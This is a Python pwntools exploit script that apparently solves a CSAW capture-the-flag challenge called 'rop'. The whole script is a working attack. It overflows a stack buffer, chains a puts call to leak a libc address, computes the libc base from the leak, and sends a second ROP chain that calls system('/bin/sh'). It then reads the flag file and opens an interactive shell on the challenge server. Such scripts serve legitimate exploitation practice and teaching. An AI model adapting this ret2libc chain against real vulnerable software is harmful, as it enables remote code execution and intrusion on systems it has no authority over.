from pwn import *

BINARY = './rop'
HOST, PORT = "pwn.chal.csaw.io", 5016
context.endian = 'little'

elf = ELF(BINARY)
context.binary = elf

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF("./libc-2.27.so")

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)
        
def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)

def go():
    p = start_binary()
    
    # if not args.REMOTE and args.GDB:
    #     debug([0x4005dc])

    rop = ROP(elf)
    
    PUTS = elf.plt['puts']
    MAIN = elf.symbols['main']
    LIBC_START_MAIN = elf.symbols['__libc_start_main']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0]

    log.info("puts@plt: " + hex(PUTS))
    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
    log.info("pop rdi gadget: " + hex(POP_RDI))
    log.info("ret: " + hex(RET))

    base = "A"*32 + "B"*8 #Overflow Buffer

    #Create rop chain
    rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(MAIN)
    p.recvline()
    p.sendline(rop)

    # #parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked lib address, __libc_start_main: " + hex(leak))
    
    libc.address = leak - libc.symbols["__libc_start_main"]
    log.info("libc  : " + hex(libc.address))
    
    SYSTEM = libc.symbols["system"]
    BINSH = next(libc.search("/bin/sh"))

    log.info("bin/sh: " + hex(BINSH))
    log.info("system: " + hex(SYSTEM))

    rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
    # print rop2
    # print p.recvline()
    p.sendline(rop2)
    
    p.sendline("cat flag.txt")
    # print p.recvline()
    p.interactive()
    # p.close()
go()